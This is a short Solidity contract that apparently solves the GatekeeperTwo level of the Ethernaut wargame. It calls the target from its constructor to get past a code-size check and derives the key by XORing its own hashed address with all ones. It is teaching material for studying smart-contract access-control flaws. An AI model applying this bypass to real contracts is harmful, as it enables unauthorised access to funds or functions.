// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract attackGate2 {

    GatekeeperTwo targetedGate;

    constructor(address _target) public {
        targetedGate = GatekeeperTwo(_target);
        targetedGate.enter(bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1)));
    }
}